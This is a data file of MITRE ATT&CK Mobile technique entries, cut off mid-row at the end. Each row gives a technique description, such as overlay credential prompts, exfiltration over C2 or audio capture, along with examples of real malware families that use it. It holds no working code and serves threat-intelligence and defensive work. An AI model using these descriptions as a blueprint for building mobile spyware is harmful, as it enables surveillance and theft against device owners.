T1661,Application Versioning,"An adversary may push an update to a previously benign application to add malicious code. This can be accomplished by pushing an initially benign, functional application to a trusted application store, such as the Google Play Store or the Apple App Store. This allows the adversary to establish a trusted userbase that may grant permissions to the application prior to the introduction of malicious code. Then, an application update could be pushed to introduce malicious code.  This technique could also be accomplished by compromising a developer’s account. This would allow an adversary to take advantage of an existing userbase without having to establish the userbase themselves. ","['[SharkBot] initially poses as a benign application, then malware is downloaded and executed after an application update.']",False
T1413,Access Sensitive Data in Device Logs,"On versions of Android prior to 4.1, an adversary may use a malicious application that holds the READ_LOGS permission to obtain private keys, passwords, other credentials, or other sensitive data stored in the device's system log. On Android 4.1 and later, an adversary would need to attempt to perform an operating system privilege escalation attack to be able to access the log.","['[Ginp] can download device log data.', '[HenBox] can monitor system logs.']",False
T1623,Command and Scripting Interpreter,"Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, Android is a UNIX-like OS and includes a basic [Unix Shell] that can be accessed via the Android Debug Bridge (ADB) or Java’s `Runtime` package.  Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access] payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells. ",['[TianySpy] can steal information via malicious JavaScript.'],False
T1544,Ingress Tool Transfer,Adversaries may transfer tools or other files from an external system onto a compromised device to facilitate follow-on actions. Files may be copied from an external adversary-controlled system through the command and control channel  or through alternate protocols with another tool such as FTP.,"['[Chameleon] can download HTML overlay pages after installation.', '[ViceLeaker] can download attacker-specified files.', '[Sunbird] can download adversary specified content from FTP shares.', '[SharkBot] can download attacker-specified files.', '[RedDrop] uses ads or other links within websites to encourage users to download the malicious apps using a complex content distribution network (CDN) and series of network redirects. [RedDrop] also downloads additional components (APKs, JAR files) from different C2 servers. ', '[Monokle] can download attacker-specified files. ', '[AbstractEmu] can receive files from the C2 at runtime.', '[Mandrake] can install attacker-specified components or applications.', '[Desert Scorpion] can upload attacker-specified files to the C2 server.']",False
T1637,Dynamic Resolution,"Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. This algorithm can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.",[],False
T1477,Exploit via Radio Interfaces,"The mobile device may be targeted for exploitation through its interface to cellular networks or other radio interfaces.  ### Baseband Vulnerability Exploitation  A message sent over a radio interface (typically cellular, but potentially Bluetooth, GPS, NFC, Wi-Fi or other) to the mobile device could exploit a vulnerability in code running on the device.  ### Malicious SMS Message  An SMS message could contain content designed to exploit vulnerabilities in the SMS parser on the receiving device. An SMS message could also contain a link to a web site containing malicious content designed to exploit the device web browser. Vulnerable SIM cards may be remotely exploited and reprogrammed via SMS messages.",['[Pegasus for iOS] was delivered via an SMS message containing a link to a web site with malicious code.'],False
T1423,Network Service Scanning,"Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation. Methods to acquire this information include port scans and vulnerability scans from the mobile device. This technique may take advantage of the mobile device's access to an internal enterprise network either through local connectivity or through a Virtual Private Network (VPN).",[],False
T1618,User Evasion,"Adversaries may attempt to avoid detection by hiding malicious behavior from the user. By doing this, an adversary’s modifications would most likely remain installed on the device for longer, allowing the adversary to continue to operate on that device.   While there are many ways this can be accomplished, one method is by using the device’s sensors. By utilizing the various motion sensors on a device, such as accelerometer or gyroscope, an application could detect that the device is being interacted with. That way, the application could continue to run while the device is not in use but cease operating while the user is using the device, hiding anything that would indicate malicious activity was ongoing. Accessing the sensors in this way does not require any permissions from the user, so it would be completely transparent.",[],True
T1646,Exfiltration Over C2 Channel,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,"['[GoldenEagle] has exfiltrated data via both SMTP and HTTP.', '[SharkBot] can exfiltrate captured user credentials and event logs back to the C2 server. ', '[Drinik] can send stolen data back to the C2 server.', '[GolfSpy] exfiltrates data using HTTP POST requests.', '[Chameleon] can send stolen data over HTTP.', '[ViceLeaker] uses HTTP data exfiltration.', ""During [Operation Dust Storm] the threat actors used Android backdoors that would send information and data from a victim's mobile device to the C2 servers."", '[AbstractEmu] can send large amounts of device data over its C2 channel, including the device’s manufacturer, model, version and serial number, telephone number, and IP address.', '[BOULDSPY] has exfiltrated cached data from infected devices.', '[Hornbill] can exfiltrate data back to the C2 server using HTTP. ', '[RedDrop] uses standard HTTP for exfiltration.', '[FlyTrap] can use HTTP to exfiltrate data to the C2 server.', '[Fakecalls] can send exfiltrated data back to the C2 server.', '[Sunbird] can exfiltrate compressed ZIP files containing gathered info to C2 infrastructure.', '[Triada] utilized HTTP to exfiltrate data through POST requests to the command and control server. ', '[FluBot] can send contact lists to its C2 server.', '[eSurv] has exfiltrated data using HTTP PUT requests.', '[XLoader for iOS] has exfiltrated data using HTTP requests.', '[Pallas] exfiltrates data using HTTP.']",False
T1404,Exploitation for Privilege Escalation,"Adversaries may exploit software vulnerabilities in order to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in an application, service, within the operating system software, or kernel itself to execute adversary-controlled code. Security constructions, such as permission levels, will often hinder access to information and use of certain techniques. Adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.   When initially gaining access to a device, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and applications running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user- level permission to root permissions depending on the component that is vulnerable. ","['Some original variants of [BrainTest] had the capability to automatically root some devices, but that behavior was not observed in later samples.', '[INSOMNIA] exploits a WebKit vulnerability to achieve root access on the device.', '[AbstractEmu] can use rooting exploits to silently give itself permissions or install additional malware.', '[Zen] can obtain root access via a rooting trojan in its infection chain.', ' [Exodus] Two attempts to elevate privileges by using a modified version of the DirtyCow exploit. ', '[Pegasus for Android] attempts to exploit well-known Android OS vulnerabilities to escalate privileges.', '[Pegasus for iOS] exploits iOS vulnerabilities to escalate privileges.', '[Agent Smith] exploits known OS vulnerabilities, including Janus, to replace legitimate applications with malicious versions.', '[DoubleAgent] has used exploit tools to gain root, such as TowelRoot.', '[Gooligan] executes Android root exploits.', '[FinFisher] comes packaged with ExynosAbuse, an Android exploit that can gain root privileges.', '[Dvmap] attempts to gain root access by using local exploits.', '[HummingBad] can exploit unfixed vulnerabilities in older Android versions to root victim phones.', '[SpyDealer] uses the commercial rooting app Baidu Easy Root to gain root privilege and maintain persistence on the victim.', '[Skygofree] has the capability to exploit several known vulnerabilities and escalate privileges.', '[ShiftyBug] is packed with at least eight publicly available exploits that can perform rooting.']",False
T1616,Call Control,"Adversaries may make, forward, or block phone calls without user authorization. This could be used for adversary goals such as audio surveillance, blocking or forwarding calls from the device owner, or C2 communication.  Several permissions may be used to programmatically control phone calls, including:  * `ANSWER_PHONE_CALLS` - Allows the application to answer incoming phone calls * `CALL_PHONE` - Allows the application to initiate a phone call without going through the Dialer interface * `PROCESS_OUTGOING_CALLS` - Allows the application to see the number being dialed during an outgoing call with the option to redirect the call to a different number or abort the call altogether * `MANAGE_OWN_CALLS` - Allows a calling application which manages its own calls through the self-managed `ConnectionService` APIs * `BIND_TELECOM_CONNECTION_SERVICE` - Required permission when using a `ConnectionService` * `WRITE_CALL_LOG` - Allows an application to write to the device call log, potentially to hide malicious phone calls  When granted some of these permissions, an application can make a phone call without opening the dialer first. However, if an application desires to simply redirect the user to the dialer with a phone number filled in, it can launch an Intent using `Intent.ACTION_DIAL`, which requires no specific permissions. This then requires the user to explicitly initiate the call or use some form of [Input Injection] to programmatically initiate it.","['[Escobar] can initiate phone calls.', '[TangleBot] can make and block phone calls.', '[Drinik] can use the Android `CallScreeningService` to silently block incoming calls.', '[BusyGasper] can open a hidden menu when a specific phone number is called from the infected device.', '[CarbonSteal] can silently accept an incoming phone call.', '[Anubis] can make phone calls.', '[Monokle] can be controlled via phone call from a set of ""control phones.""', '[Fakecalls] can intercept and imitate phone conversations by breaking the connection and displaying a fake call screen. It can also make outgoing calls and spoof incoming calls.']",False
T1436,Commonly Used Port,Adversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend with normal network activity to avoid more detailed inspection.   They may use commonly open ports such as  * TCP:80 (HTTP) * TCP:443 (HTTPS) * TCP:25 (SMTP) * TCP/UDP:53 (DNS)  They may use the protocol associated with the port or a completely different protocol.,"['[FinFisher] exfiltrates data over commonly used ports, such as ports 21, 53, and 443.', '[Mandrake] has communicated with the C2 server over TCP port 443.', 'The Android/Chuli.A malicious application sent to activist groups used uploads to an http URL as a command and control mechanism.']",False
T1439,Eavesdrop on Insecure Network Communication,"If network traffic between the mobile device and remote servers is unencrypted or is encrypted in an insecure manner, then an adversary positioned on the network can eavesdrop on communication.",[],True
T1517,Access Notifications,"Adversaries may collect data within notifications sent by the operating system or other applications. Notifications may contain sensitive data such as one-time authentication codes sent over SMS, email, or other mediums. In the case of Credential Access, adversaries may attempt to intercept one-time code sent to the device. Adversaries can also dismiss notifications to prevent the user from noticing that the notification has arrived and can trigger action buttons contained within notifications. ","['[AbstractEmu] can monitor notifications.', '[Bread] can collect device notifications.', '[Mandrake] can capture all device notifications and hide notifications from the user.', '[Chameleon] can register as an `SMSBroadcast` receiver to monitor incoming SMS messages.', '[Corona Updates] can collect messages from GSM, WhatsApp, Telegram, Facebook, and Threema by reading the application’s notification content.', '[S.O.V.A.] can silently intercept and manipulate notifications. [S.O.V.A.] can also inject cookies via push notifications.', '[Hornbill] has monitored for SMS and WhatsApp notifications.', '[Escobar] can monitor a device’s notifications.', '[WolfRAT] can receive system notifications.', '[FluBot] can access app notifications.', '[SharkBot] can intercept notifications to send to the C2 server and take advantage of the Direct Reply feature.']",False
T1410,Network Traffic Capture or Redirection,"An adversary may capture network traffic to and from the device to obtain credentials or other sensitive data, or redirect network traffic to flow through an adversary-controlled gateway to do the same.  A malicious app could register itself as a VPN client on Android or iOS to gain access to network packets. However, on both platforms, the user must grant consent to the app to act as a VPN client, and on iOS the app requires a special entitlement that must be granted by Apple.  Alternatively, if a malicious app is able to escalate operating system privileges, it may be able to use those privileges to gain access to network traffic.  An adversary could redirect network traffic to an adversary-controlled gateway by establishing a VPN connection or by manipulating the device's proxy settings. For example, Skycure  describes the ability to redirect network traffic by installing a malicious iOS Configuration Profile.  If applications encrypt their network traffic, sensitive data may not be accessible to an adversary, depending on the point of capture.","["" [Monokle] can install attacker-specified certificates to the device's trusted certificate store, enabling an adversary to perform adversary-in-the-middle attacks. "", 'Most [KeyRaider] samples hook SSLRead and SSLWrite functions in the itunesstored process to intercept device communication with the Apple App Store.']",True
T1411,Input Prompt,"The operating system and installed applications often have legitimate needs to prompt the user for sensitive information such as account credentials, bank account information, or Personally Identifiable Information (PII). Adversaries may mimic this functionality to prompt users for sensitive information.  Compared to traditional PCs, the constrained display size of mobile devices may impair the ability to provide users with contextual information, making users more susceptible to this technique’s use.  Specific approaches to this technique include:  ### Impersonate the identity of a legitimate application  A malicious application could impersonate the identity of a legitimate application (e.g. use the same application name and/or icon) and get installed on the device. The malicious app could then prompt the user for sensitive information.  ### Display a prompt on top of a running legitimate application  A malicious application could display a prompt on top of a running legitimate application to trick users into entering sensitive information into the malicious application rather than the legitimate application. Typically, the malicious application would need to know when the targeted application (and individual activity within the targeted application) is running in the foreground, so that the malicious application knows when to display its prompt. Android 5.0 and 5.1.1, respectively, increased the difficulty of determining the current foreground application through modifications to the `ActivityManager` API.. A malicious application can still abuse Android’s accessibility features to determine which application is currently in the foreground. Approaches to display a prompt include:  * A malicious application could start a new activity on top of a running legitimate application. Android 10 places new restrictions on the ability for an application to start a new activity on top of another application, which may make it more difficult for adversaries to utilize this technique. * A malicious application could create an application overlay window on top of a running legitimate application. Applications must hold the `SYSTEM_ALERT_WINDOW` permission to create overlay windows. This permission is handled differently than typical Android permissions, and at least under certain conditions is automatically granted to applications installed from the Google Play Store. The `SYSTEM_ALERT_WINDOW` permission and its associated ability to create application overlay windows are expected to be deprecated in a future release of Android in favor of a new API.  ### Fake device notifications  A malicious application could send fake device notifications to the user. Clicking on the device notification could trigger the malicious application to display an input prompt.",['[Android Overlay Malware] used view overlay techniques to present credential input UIs to trick users into providing their banking credentials.'],True
T1639,Exfiltration Over Alternative Protocol,"Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.   Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Different protocol channels could also include Web services such as cloud storage. Adversaries may opt to also encrypt and/or obfuscate these alternate channels. ","['[TianySpy] can exfiltrate collected user data, including credentials and authorized cookies, via email. ']",False
T1460,Biometric Spoofing,,[],True
T1398,Boot or Logon Initialization Scripts,Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence. Initialization scripts are part of the underlying operating system and are not accessible to the user unless the device has been rooted or jailbroken. ,"[""[OldBoot] uses escalated privileges to modify the init script on the device's boot partition to maintain persistence."", '[BOULDSPY] can exfiltrate data when the user boots the app, or on device boot.']",False
T1627,Execution Guardrails,"Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign. Values an adversary can provide about a target system or environment to use as guardrails may include environment information such as location.  Guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical [System Checks] While use of [System Checks] may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.",[],False
T1432,Access Contact List,"An adversary could call standard operating system APIs from a malicious application to gather contact list (i.e., address book) data, or with escalated privileges could directly access files containing contact list data.",[],True
T1645,Compromise Client Software Binary,"Adversaries may modify system software binaries to establish persistent access to devices. System software binaries are used by the underlying operating system and users over adb or terminal emulators.   Adversaries may make modifications to client software binaries to carry out malicious tasks when those binaries are executed. For example, malware may come with a pre-compiled malicious binary intended to overwrite the genuine one on the device. Since these binaries may be routinely executed by the system or user, the adversary can leverage this for persistent access to the device. ","['[BusyGasper] can abuse existing root access to copy components into the system partition.', '[BrainTest] uses root privileges (if available) to copy an additional Android app package (APK) to /system/priv-app to maintain persistence even after a factory reset.', '[ShiftyBug] is auto-rooting adware that embeds itself as a system application, making it nearly impossible to remove.', '[DoubleAgent] has used exploits to root devices and install additional malware on the system partition.', '[Pegasus for iOS] modifies the system partition to maintain persistence.', '[SpyDealer] maintains persistence by installing an Android application package (APK) on the system partition.', '[Monokle] can remount the system partition as read/write to install attacker-specified certificates. ', ""[Pegasus for Android] attempts to modify the device's system partition.""]",False
T1445,Abuse of iOS Enterprise App Signing Key,,"['ZergHelper ""abuses enterprises certificate and personal certificates to sign and distribute apps, which may include code that hasn’t been reviewed, or abuse private APIs.""', '""YiSpecter\'s malicious apps were signed with three iOS enterprise certificates issued by Apple so that they can be installed as enterprise apps on non-jailbroken iOS devices.""']",True
T1450,Exploit SS7 to Track Device Location,An adversary could exploit signaling system vulnerabilities to track the location of mobile devices.     ,[],True
T1575,Native API,"Adversaries may use Android’s Native Development Kit (NDK) to write native functions that can achieve execution of binaries or functions. Like system calls on a traditional desktop operating system, native code achieves execution on a lower level than normal Android SDK calls.  The NDK allows developers to write native code in C or C++ that is compiled directly to machine code, avoiding all intermediate languages and steps in compilation that higher level languages, like Java, typically have. The Java Native Interface (JNI) is the component that allows Java functions in the Android app to call functions in a native library.  Adversaries may also choose to use native functions to execute malicious code since native actions are typically much more difficult to analyze than standard, non-native behaviors.","['[TERRACOTTA] has included native modules.', '[HenBox] has contained native libraries.', '[Asacub] has implemented functions in native code.', '[CarbonSteal] has seen native libraries used in some reported samples ', '[CHEMISTGAMES] has utilized native code to decrypt its malicious payload.', '[Bread] has used native code in an attempt to disguise malicious functionality.']",False
T1476,Deliver Malicious App via Other Means,"Malicious applications are a common attack vector used by adversaries to gain a presence on mobile devices. This technique describes installing a malicious application on targeted mobile devices without involving an authorized app store (e.g., Google Play Store or Apple App Store). Adversaries may wish to avoid placing malicious applications in an authorized app store due to increased potential risk of detection or other reasons. However, mobile devices often are configured to allow application installation only from an authorized app store which would prevent this technique from working.  Delivery methods for the malicious application include:  * [Spearphishing Attachment] - Including the mobile app package as an attachment to an email message. * [Spearphishing Link] - Including a link to the mobile app package within an email, text message (e.g. SMS, iMessage, Hangouts, WhatsApp, etc.), web site, QR code, or other means. * Third-Party App Store - Installed from a third-party app store (as opposed to an authorized app store that the device implicitly trusts as part of its default behavior), which may not apply the same level of scrutiny to apps as applied by an authorized app store.  Some Android malware comes with functionality to install additional applications, either automatically or when the adversary instructs it to.","['[SimBad] can install attacker-specified applications.', '[Riltok] is distributed via phishing SMS messages from infected devices.', '[Bouncing Golf] delivered GolfSpy via a hosted application binary advertised on social media. ', '[Marcher] is delivered via a link sent by SMS or email, including instructions advising the user to modify their Android device security settings to enable apps to be installed from ""Unknown Sources.""', '[Bread] can install additional applications.', '[ZergHelper] abuses enterprises certificate and personal certificates to sign and distribute apps.', '[GolfSpy] can install attacker-specified applications.', '[Pallas] has the ability to download and install attacker-specified applications.', '[ViperRAT] has been distributed through 3rd party websites.', '[MazarBOT] is delivered via an unsolicited text message containing a link to a web download URI.', '[AndroidOS/MalLocker.B] has been spread using direct download links. ', '[Twitoor] can install attacker-specified applications.', '[Tiktok Pro] has been distributed via direct download on 3rd party websites, with the link sent in phishing SMS messsages.', '[Red Alert 2.0] has been distributed via webpages designed to look like the Play Store.', '[eSurv] has been distributed via phishing websites with geo-restrictions that allow access to only Italian and Turkmenistani mobile carriers. [eSurv] can install applications via malicious iOS provisioning profiles containing the developer’s certificate.', '[FakeSpy] is spread via direct download links in SMS phishing messages.', '[ViceLeaker] was primarily distributed via Telegram and WhatsApp messages.', '[XLoader for Android] has been distributed via phishing websites.', '[YiSpecter] malicious apps were signed with iOS enterprise certificates issued by Apple to allow the apps to be installed as enterprise apps on non-jailbroken iOS devices.', '[RedDrop] uses ads or other links within websites to encourage users to download the malicious apps using a complex content distribution network (CDN) and series of network redirects. [RedDrop] also downloads additional components (APKs, JAR files) from different C2 servers.', '[Exobot] has been spread using direct download links.', '[XLoader for Android] has been distributed via phishing SMS messages, which link to a malicious website hosting a device profile.', '[Dark Caracal] distributes [Pallas] via trojanized applications hosted on watering hole websites. ', '[RuMMS] is delivered via an SMS message containing a link to an APK (Android application package).', '[Asacub] has been spread via phishing SMS messages that contain a link to a website that hosts the malicious APK file.', '[Anubis] was distributed via phishing link in an email.', '[Rotexy] is distributed through phishing links sent in SMS messages as `AvitoPay.apk`.', '[HenBox] has been distributed via third-party app stores.', '[Gustuff] was distributed via SMS phishing messages to numbers exfiltrated from compromised devices’ contact lists. The phishing SMS messages are sent from the compromised device to the target device.', '[Windshift] has distributed malicious apps via their own websites during Operation BULL.', '[Agent Smith] has been distributed through the 9apps app store. ', '[Android/Chuli.A] was delivered via a spearphishing message containing a malicious Android application as an attachment.', '[Cerberus] has been delivered to the device via websites that prompt the user to “[…] install Adobe Flash Player” and then downloads the malicious APK to the device.', '[Android Overlay Malware] was distributed by sending SMS messages with an embedded link to the malware.']",False
T1469,Remotely Wipe Data Without Authorization,An adversary who is able to obtain unauthorized access to or misuse authorized access to cloud services (e.g. Google's Android Device Manager or Apple iCloud's Find my iPhone) or to an EMM console could use that access to wipe enrolled devices .,[],False
T1658,Exploitation for Client Execution,"Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to insecure coding practices that can lead to unanticipated behavior. Adversaries may take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.   Adversaries may use device-based zero-click exploits for code execution. These exploits are powerful because there is no user interaction required for code execution.   ### SMS/iMessage Delivery    SMS and iMessage in iOS are common targets through [Drive-By Compromise] [Phishing] etc. Adversaries may use embed malicious links, files, etc. in SMS messages or iMessages. Mobile devices may be compromised through one-click exploits, where the victim must interact with a text message, or zero-click exploits, where no user interaction is required.   ### AirDrop   Unique to iOS, AirDrop is a network protocol that allows iOS users to transfer files between iOS devices. Before patches from Apple were released, on iOS 13.4 and earlier, adversaries may force the Apple Wireless Direct Link (AWDL) interface to activate, then exploit a buffer overflow to gain access to the device and run as root without interaction from the user.  ",['[Pegasus for iOS] can compromise iPhones running iOS 16.6 without any user interaction.'],False
T1604,Proxy Through Victim,"Adversaries may use a compromised device as a proxy server to the Internet. By utilizing a proxy, adversaries hide the true IP address of their C2 server and associated infrastructure from the destination of the network traffic. This masquerades an adversary’s traffic as legitimate traffic originating from the compromised device, which can evade IP-based restrictions and alerts on certain services, such as bank accounts and social media websites.  The most common type of proxy is a SOCKS proxy. It can typically be implemented using standard OS-level APIs and 3rd party libraries with no indication to the user. On Android, adversaries can use the `Proxy` API to programmatically establish a SOCKS proxy connection, or lower-level APIs to interact directly with raw sockets.","['[FluBot] can use a SOCKS proxy to evade C2 IP detection.', '[Exobot] can open a SOCKS proxy connection through the compromised device.']",False
T1520,Domain Generation Algorithms,"Adversaries may use [Domain Generation Algorithms] (DGAs) to procedurally generate domain names for command and control communication, and other uses such as malicious application distribution.  DGAs increase the difficulty for defenders to block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.",[],True
T1435,Access Calendar Entries,"An adversary could call standard operating system APIs from a malicious application to gather calendar entry data, or with escalated privileges could directly access files containing calendar data.",[],True
T1465,Rogue Wi-Fi Access Points,"An adversary could set up unauthorized Wi-Fi access points or compromise existing access points and, if the device connects to them, carry out network-based attacks such as eavesdropping on or modifying network communication.",[],True
T1541,Foreground Persistence,"Adversaries may abuse Android's `startForeground()` API method to maintain continuous sensor access. Beginning in Android 9, idle applications running in the background no longer have access to device sensors, such as the camera, microphone, and gyroscope. Applications can retain sensor access by running in the foreground, using Android’s `startForeground()` API method. This informs the system that the user is actively interacting with the application, and it should not be killed. The only requirement to start a foreground service is showing a persistent notification to the user.  Malicious applications may abuse the `startForeground()` API method to continue running in the foreground, while presenting a notification to the user pretending to be a genuine application. This would allow unhindered access to the device’s sensors, assuming permission has been previously granted.  Malicious applications may also abuse the `startForeground()` API to inform the Android system that the user is actively interacting with the application, thus preventing it from being killed by the low memory killer.","['[Mandrake] uses foreground persistence to keep a service running. It shows the user a transparent notification to evade detection.', '[TERRACOTTA] has utilized foreground services.', '[Drinik] has C2 commands that can move the malware in and out of the foreground. ', '[Tiktok Pro] has shown a persistent notification to maintain access to device sensors.']",False
T1458,Replication Through Removable Media,"Adversaries may move onto devices by exploiting or copying malware to devices connected via USB. In the case of Lateral Movement, adversaries may utilize the physical connection of a device to a compromised or malicious charging station or PC to bypass application store requirements and install malicious applications directly. In the case of Initial Access, adversaries may attempt to exploit the device via the connection to gain access to data stored on the device. Examples of this include:    * Exploiting insecure bootloaders in a Nexus 6 or 6P device over USB and gaining the ability to perform actions including intercepting phone calls, intercepting network traffic, and obtaining the device physical location.  * Exploiting weakly-enforced security boundaries in Android devices such as the Google Pixel 2 over USB.  * Products from Cellebrite and Grayshift purportedly that can exploit some iOS devices using physical access to the data port to unlock the passcode. ","['[WireLurker] monitors for iOS devices connected via USB to an infected OSX computer and installs downloaded third-party applications or automatically generated malicious applications onto the device.', '[DualToy] side loads malicious or risky apps to both Android and iOS devices via a USB connection.']",False
T1429,Audio Capture,"Adversaries may capture audio to collect information by leveraging standard operating system APIs of a mobile device. Examples of audio information adversaries may target include user conversations, surroundings, phone calls, or other sensitive information.      Android and iOS, by default, require that applications request device microphone access from the user.       On Android devices, applications must hold the `RECORD_AUDIO` permission to access the microphone or the `CAPTURE_AUDIO_OUTPUT` permission to access audio output. Because Android does not allow third-party applications to hold the `CAPTURE_AUDIO_OUTPUT` permission by default, only privileged applications, such as those distributed by Google or the device vendor, can access audio output. However, adversaries may be able to gain this access after successfully elevating their privileges. With the `CAPTURE_AUDIO_OUTPUT` permission, adversaries may pass the `MediaRecorder.AudioSource.VOICE_CALL` constant to `MediaRecorder.setAudioOutput`, allowing capture of both voice call uplink and downlink.      On iOS devices, applications must include the `NSMicrophoneUsageDescription` key in their `Info.plist` file to access the microphone.","['[Skygofree] can record audio via the microphone when an infected device is in a specified location.', '[Pegasus for Android] has the ability to record device audio.', '[RCSAndroid] can record audio using the device microphone.', '[eSurv] can record audio.', '[BOULDSPY] can access a device’s microphone to record audio, as well as cell and VoIP application calls.', '[XLoader for Android] covertly records phone calls.', '[Sunbird] can record environmental and call audio.', '[FlexiSpy] can record both incoming and outgoing phone calls, as well as microphone audio.', '[WolfRAT] can record call audio.', '[Stealth Mango] can record audio using the device microphone.', '[Golden Cup] can record audio from the microphone and phone calls. ', '[DoubleAgent] has captured audio and can record phone calls.', '[Tiktok Pro] can capture audio from the device’s microphone and can record phone calls.', '[Hornbill] can record environmental and call audio.', '[Windshift] has included phone call and audio recording capabilities in the malicious apps deployed as part of Operation BULL and Operation ROCK.', '[BusyGasper] can record audio.', '[Fakecalls] can turn on a device’s microphone to capture audio.', '[AbstractEmu] can grant itself microphone permissions.', '[Desert Scorpion] can record audio from phone calls and the device microphone.', '[TangleBot] can record audio using the device microphone.', '[DroidJack] is capable of recording device phone calls.', '[FinFisher] uses the device microphone to record phone conversations.', '[HenBox] can access the device’s microphone.', '[Corona Updates] can record MP4 files and monitor calls.', "" [Exodus] Two can record audio from the compromised device's microphone and can record call audio in 3GP format. "", '[GoldenEagle] has recorded calls and environment audio in .amr format.', ""[Tangelo] contains functionality to record calls as well as the victim device's environment."", '[AndroRAT] gathers audio from the microphone.', '[CarbonSteal] can remotely capture device audio.', '[Pegasus for iOS] has the ability to record audio.', ""[SpyNote RAT] can activate the victim's microphone."", '[Pallas] captures audio from the device microphone.', '[GolfSpy] can record audio and phone calls.', ""[Monokle] can record audio from the device's microphone and can record phone calls, specifying the output audio quality."", '[ViperRAT] can collect and record audio content.', '[FrozenCell] has recorded calls.', '[Dendroid] can record audio and outgoing calls.', '[Anubis] can record phone calls and audio.', '[Escobar] can record audio from the device’s microphone.', '[ViceLeaker] can record audio from the device’s microphone and can record phone calls together with the caller ID.', '[SpyDealer] can record phone calls and surrounding audio.', ""[RedDrop] captures live recordings of the device's surroundings."", '[Dendroid] can record audio using the device microphone.']",False
T1625,Hijack Execution Flow,"Adversaries may execute their own malicious payloads by hijacking the way operating systems run applications. Hijacking execution flow can be for the purposes of persistence since this hijacked execution may reoccur over time.   There are many ways an adversary may hijack the flow of execution. A primary way is by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs or resources, such as file directories, could also be poisoned to include malicious payloads.",['[YiSpecter] has hijacked normal application’s launch routines to display ads.'],False
T1437,Application Layer Protocol,"Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the mobile device, and often the results of those commands, will be embedded within the protocol traffic between the mobile device and server.   Adversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS.","['[DoubleAgent] has used both FTP and TCP sockets for data exfiltration.', '[Drinik] has code to use Firebase Cloud Messaging for receiving C2 instructions.', '[ANDROIDOS_ANSERVER.A] uses encrypted content within a blog site for part of its command and control. Specifically, the encrypted content contains URLs for other servers to be used for other aspects of command and control.']",False
T1431,App Delivered via Web Download,,"['MazarBOT is delivered via an unsolicited text message containing a link to a web download URI.', 'RuMMS is delivered via a web link to an APK (Android application package). The link is sent via SMS.', 'AndroidOverlayMalware was distributed by sending ""SMS messages with an embedded link that leads to the malware app.""']",True
T1407,Download New Code at Runtime,"Adversaries may download and execute dynamic code not included in the original application package after installation. This technique is primarily used to evade static analysis checks and pre-publication scans in official app stores. In some cases, more advanced dynamic or behavioral analysis techniques could detect this behavior. However, in conjunction with [Execution Guardrails] techniques, detecting malicious code downloaded after installation could be difficult.  On Android, dynamic code could include native code, Dalvik code, or JavaScript code that utilizes Android WebView’s `JavascriptInterface` capability.   On iOS, dynamic code could be downloaded and executed through 3rd party libraries such as JSPatch.  ","['[Triada] utilizes a backdoor in a Play Store app to install additional trojanized apps from the Command and Control server.', '[Dvmap] can download code and binaries from the C2 server to execute on the device as root.', '[ViperRAT] has been installed in two stages and can secretly install new applications.', '[SharkBot] can use the Android “Direct Reply” feature to spread the malware to other devices. It can also download the full version of the malware after initial device compromise.', '[Desert Scorpion] has been distributed in multiple stages.', '[BOULDSPY] can download and run code obtained from the C2.', '[EventBot] can download new libraries when instructed to.', '[Golden Cup] has been distributed in two stages.', '[Bread] has utilized JavaScript within WebViews that loaded a URL hosted on a Bread-controlled server which provided functions to run. [Bread] downloads billing fraud execution steps at runtime.', '[Red Alert 2.0] can download additional overlay templates.', '[Cerberus] can update the malicious payload module on command.', '[DoubleAgent] has downloaded additional code to root devices, such as TowelRoot.', '[GPlayed] has the capability to remotely load plugins and download and compile new .NET code. ', '[FrozenCell] has downloaded and installed additional applications.', '[Zen] can dynamically load executable code from remote sources.', ' [Exodus] One, after checking in, sends a POST request and then downloads  [Exodus] Two, the second stage binaries. ', '[SpyDealer] downloads and executes root exploits from a remote server.', '[CarbonSteal] can dynamically load additional functionality.', 'Original samples of [BrainTest] download their exploit packs for rooting from a remote server after installation.', ""[Judy] bypasses Google Play's protections by downloading a malicious payload at runtime after installation."", '[RCSAndroid] has the ability to dynamically download and execute new code at runtime.', '[BusyGasper] can download a payload or updates from either its C2 server or email attachments in the adversary’s inbox.', '[Skygofree] can download 